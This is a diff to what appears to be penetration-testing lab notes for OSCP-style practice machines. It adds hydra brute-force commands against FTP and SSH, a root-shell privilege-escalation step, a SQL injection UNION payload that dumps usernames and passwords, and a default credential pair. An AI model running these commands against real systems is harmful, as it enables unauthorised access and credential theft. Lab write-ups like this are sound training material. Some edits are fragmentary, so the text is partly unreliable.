@@ -197,7 +197,7 @@ mkdir: cannot create directory ?/opt/tools/server-health.sh?: No such file or di
 $ mkdir /opt/tools/
 $ touch /opt/tools/server-health.sh
 $ cat /opt/tools/server-health.sh
-$ nano /opt/tools/server-health.sh
+$ nano /opt/tools/server-health.sh (#!/bin/bash bash)
 $ chmod 777 /opt/tools/server-health.sh
 $ sudo -u root /opt/tools/server-health.sh
 root@so-simple:/# id
@@ -502,7 +502,15 @@ root@red:/root#
 ```
 
 - Rooted. 
-
+```
+Alternative 
+hydra -l elly -e nsr ftp://192.168.151.148 
+get passwd after ftp login
+cat passwd | cut -d ":" -f1
+hydra -L stapler_user -P stapler_user ssh://192.168.151.148 
+cat */.bash_history
+ssh peter@localhost
+```
 
 ## eLection1 
 1. Rustscan and Nmap
@@ -589,6 +597,8 @@ admin
 wordpress
 user
 election
+
+(root:toor)
 ```
 
 4. Find out subdirectory /election. Dirsearch for subdirectory.  Found credentials in one of them. 
@@ -1016,6 +1026,9 @@ search=fuzz
 
 ┌──(kali㉿kali)-[~/OSCP/pg]
 └─$ sqlmap -r req --dump --batch --dbms=mysql --dbs -D users
+
+(' UNION SELECT id,firstname,lastname,username,password,6 FROM users.UserDetails -- ')
+grep -iE 'position' users | awk -F': ' '{print $2}' > usernames
 ```
 
 4. Found users and passwords. 
